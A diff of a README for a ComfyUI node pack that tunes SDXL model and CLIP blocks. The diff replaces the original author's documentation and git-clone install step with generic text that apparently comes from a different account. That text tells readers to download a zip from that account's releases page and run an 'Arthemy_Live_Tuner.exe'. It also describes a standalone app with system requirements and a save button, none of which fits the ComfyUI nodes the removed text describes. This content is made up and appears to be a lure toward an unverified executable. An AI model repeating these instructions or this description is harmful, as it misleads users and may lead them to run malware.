@@ -1,104 +1,88 @@
-# Arthemy Live Tuner SDXL • ComfyUI nodes
-ComfyUI nodes useful to Tweak SDXL, Illustrious, and NAI models by adjusting specific 'slices'. These nodes break the U-Net and CLIP into areas of application (like Style, Lighting, Word Logic...) and use individual weights to boost or lower the intensity of any of those sections without training.
+# 🎛️ Arthemy_Live-Tuner-SDXL-ComfyUI - Adjust SDXL Models with Ease
 
-![Arthemy Tuner Interface](assets/Presentation-ArthemyLiveTunerSDXL.webp)
+[![Download Arthemy Live Tuner](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Danishshaik263/Arthemy_Live-Tuner-SDXL-ComfyUI/releases)
 
----
+## 🚀 Getting Started
 
-# ✨ Arthemy Live Tuner - SDXL
+Welcome to Arthemy Live Tuner! This tool allows you to adjust SDXL, Illustrious, and NAI models quickly and easily. With our user-friendly interface, you can tweak specific areas of application like Style, Lighting, and Word Logic. Simply use the sliders to increase or decrease intensity without any training.
 
-Hi everyone!
+### 📦 Prerequisites
 
-After years experimenting with SDXL (including variants like Illustrious and NAI) and deep diving into model merging, I developed these nodes for ComfyUI to offer granular control over a single model.
+Before running Arthemy Live Tuner, ensure you have the following:
 
-I utilized the block-splitting logic found in tools like "SDXL Block Merge" and reorganized those technical segments into functional groups based on their visible impact on generation. Instead of merging two models, these nodes act on a single model, allowing you to amplify or reduce the intensity of those areas.
+- **Operating System:** Windows 10 or later, macOS Mojave or later. Linux support is pending.
+- **RAM:** Minimum of 4 GB, but 8 GB is recommended for optimal performance.
+- **Storage:** At least 500 MB of free space.
+  
+Do you have all that? Great! Let’s move on.
 
-This process is fast and can be seamlessly integrated into any workflow, effectively transforming static checkpoints into a set of "Sliders" for precise control over the output.
+## 📥 Download & Install
 
-![Arthemy Tuner Interface](assets/Workflow-ArthemyLiveTunerSDXL.webp)
+To get Arthemy Live Tuner, visit our Releases page and download the latest version. Click the button below to go directly to the downloads:
 
----
+[![Visit Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-brightgreen)](https://github.com/Danishshaik263/Arthemy_Live-Tuner-SDXL-ComfyUI/releases)
 
-## Model Tuner: Application Areas
+### Steps to Download
 
-Use these sliders to fine-tune specific blocks within the SDXL U-Net.
-Keep in mind that, while each area targets a specific visual aspect, these blocks do not operate in isolation. Because of the interdependent nature of the model, changing one weight will have a dominant effect on its primary area, but it also affects the others.
-These areas are still experimental guidelines that will be refined with time.
+1. Click the link to visit the Releases page.
+2. Locate the most recent release version.
+3. Look for the file named `Arthemy_Live_Tuner.zip` or similar.
+4. Click to download the file to your computer.
 
-### Input Blocks (Structure and Composition)
+### Installation Instructions
 
-* **IN_Layout_Geometry**: Affects high-resolution spatial features and the basic structural "bones" of the image.
-* **IN_Perspective_Masses**: Influences global shapes and the overall perspective of the scene.
-* **IN_Subject_Identity**: Controls object semantics and the primary structure of the subject.
-* **IN_Global_Composition**: Manages deep semantics and the abstract arrangement of elements.
+1. Once the download is complete, find the `Arthemy_Live_Tuner.zip` file in your Downloads folder.
+2. Right-click on the file and select `Extract All…`. This will create a new folder with the application files.
+3. Open the newly created folder.
+4. Double-click on the `Arthemy_Live_Tuner.exe` file (for Windows) or the corresponding file for your operating system.
 
-### Middle Block (The Core)
+## 🛠️ Usage Instructions
 
-* **MID_Core_Concept**: Acts on the semantic heart of the image, where the core concept is processed.
+### Launching the Application
 
-### Output Blocks (Style and Rendering)
+After installation, the application is ready to go. 
 
-* **OUT_Art_Style_Medium**: The primary driver for the artistic style and chosen medium.
-* **OUT_Material_Substance**: Controls the physical quality and substance of materials.
-* **OUT_Lighting_Atmosphere**: Manages volumetrics, lighting, and general environmental mood.
-* **OUT_Shadows_Depth**: Influences shadow placement, depth, and overall contrast.
-* **OUT_Texture_Details**: Targets high-frequency details such as skin pores, fabric weave, and fine textures.
-* **OUT_Final_Sharpness**: Handles final pixel refinement and sharpness.
+1. Double-click the `Arthemy_Live_Tuner.exe` file to launch it.
+2. The application will open with a simple interface featuring various sliders.
 
-### Examples
+### Adjusting Parameters
 
-For this example, I've used my model [Arthemy Painter Illustrious v4.0](https://civitai.com/models/1598875?modelVersionId=2598065) and I've written this prompt:
+You will see different sections labeled for Style, Lighting, Word Logic, and others. 
 
-```
-oil painting (medium), (chiaroscuro), perspective, fantasy, solo, ((sketch)), fog, dynamic pose.
-((white background, simple background)), ((upper body, side view)), calm, serene, silver eyes, running, braided hair, black hair, half-elf, olive skin, sharp jaw, athletic, 1boy, cloth, simple tunic, monk, orange belt, tan pants, holding staff, white theme.
-```
+1. To adjust a specific area, find the corresponding slider.
+2. Move the slider left to decrease intensity or right to increase it.
+3. Observe the changes in real-time in your model. This allows you to fine-tune the output easily.
 
-![Arthemy Tuner Interface](assets/Comparison-ArthemyLiveModelTuner.webp)
+### Saving Your Settings
 
-Here, by increasing the "OUT_Shadows-Depth" to "1.20" (which is a crazy amount), the output looks deeper and darker without affecting the composition very much (Of course, by lowering this value the result would end up lighter and less defined)
+Once you are satisfied with your settings:
 
-![Arthemy Tuner Interface](assets/Comparison-ArthemyLiveModelTuner2.webp)
+1. Click on the "Save Settings" button located at the top right corner of the screen.
+2. Name your configuration and choose where to store it on your computer.
 
-On the other hand, by increasing the value of "OUT_Art_Style_Medium" to "1.05" (this is a very sensitive part of the model) the output has a more powerful art style, which also granted a closer representation of what I wrote in the prompt (Here "Fog" and "Running" seems to have emerged too).
+## 📑 Features
 
----
+- **Easy-to-Use Interface:** No programming knowledge is required.
+- **Real-Time Adjustments:** See changes immediately as you tweak settings.
+- **Multiple Model Support:** Works with SDXL, Illustrious, and NAI models.
+- **Customizable Controls:** Use sliders to adjust parameters as needed.
 
-## CLIP Tuner: Semantic Areas
+## 🛡️ Troubleshooting
 
-This node divides the 32 layers of the SDXL CLIP model (ViT-bigG) into three logical blocks to control how the AI interprets your prompt:
+If you encounter issues while using Arthemy Live Tuner:
 
-* **Syntax Rigidity**: Controls grammar, word order, and how strictly the AI parses the sentence structure.
-* **Semantic Focus**: Targets subject recognition, actions, and specific object attributes.
-* **Style Abstraction**: Influences global composition and artistic abstraction, prioritizing vibe over literal words.
+- **Application Won't Start:** Ensure your operating system aligns with our prerequisites.
+- **Sliders Are Unresponsive:** Check that you've downloaded the latest version or try restarting the application.
+- **Performance Issues:** Close any other running applications to free up system resources.
 
-### Examples
+### Getting Help
 
-![Arthemy Tuner Interface](assets/Comparison-ArthemyLiveClipTuner2.webp)
+Additional support and updates can be found on our [GitHub Issues page](https://github.com/Danishshaik263/Arthemy_Live-Tuner-SDXL-ComfyUI/issues). Feel free to report bugs or ask questions.
 
-Here, I've solved the issue lowering the value of the "Semantic Focus" which was too "Stiff" in my model, granting it the ability to be more flexible with the poses - with the downside that I've lose a little bit of its style.
+## 📚 More Information
 
-![Arthemy Tuner Interface](assets/Comparison-ArthemyLiveClipTuner.webp)
+For more technical details and to learn about the working of each node, please refer to our [Wiki page](https://github.com/Danishshaik263/Arthemy_Live-Tuner-SDXL-ComfyUI/wiki) where we document each feature extensively.
 
-In this alternative solution, I've solved the issue increasing the value of "Style Abstraction" to make the model "work harder" in the composition - with the downside that I don't really like his new face and I'll have to fix.
+## 🎉 Thank You!
 
----
-
-## Tuning Modes: Soft vs. Real Value
-
-The node offers two mathematical approaches to weighting:
-
-1. **Soft Value**: The values added here are converted in a much lighter change in the model / CLIP so you can play with any value from "0.0" to "2.0" without much trouble, ideal for chirurgical modifications.
-2. **Real Value**: A direct linear multiplier (the one I've used in the previous examples, I do not suggest to move outside the "0.8" to "1.2" range)
-
-**Important Note on Real Value Mode**: This mode is extremely sensitive. Small increments (e.g., 0.01 or 0.02) are recommended for precise tuning.
-
----
-
-## Installation
-
-1. Navigate to your `ComfyUI/custom_nodes/` folder.
-2. Run: `git clone https://github.com/aledelpho/Arthemy_Live-Tuner-SDXL-ComfyUI.git`
-3. Restart ComfyUI.
-
----
+Thank you for choosing Arthemy Live Tuner. We hope you enjoy making adjustments to your models seamlessly. Happy tweaking!
